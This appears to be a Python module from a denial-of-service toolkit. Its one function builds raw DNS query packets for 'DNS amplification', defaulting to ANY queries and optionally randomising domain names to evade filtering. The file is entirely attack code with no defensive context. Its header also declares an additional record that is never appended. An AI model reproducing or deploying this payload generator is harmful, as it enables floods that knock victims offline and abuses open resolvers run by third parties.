import random

def generate_payload(target, options=None):
    """
    DNS amplification, supports ANY/A/custom domain/mutation
    options:
      - domain: str, query domain
      - qtype: str, query type (ANY/A/NS/etc)
      - mutate: bool, whether to mutate
    """
    domain = options.get('domain', 'example.com') if options else 'example.com'
    qtype = options.get('qtype', 'ANY').upper() if options else 'ANY'
    mutate = options.get('mutate', False) if options else False
    if mutate:
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,15))) + '.com'
    qtype_map = {'A': 1, 'NS': 2, 'CNAME': 5, 'ANY': 255}
    qtype_val = qtype_map.get(qtype, 255)
    q = b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
    for part in domain.split('.'):
        q += bytes([len(part)]) + part.encode()
    q += b'\x00' + qtype_val.to_bytes(2, 'big') + b'\x00\x01'
    return q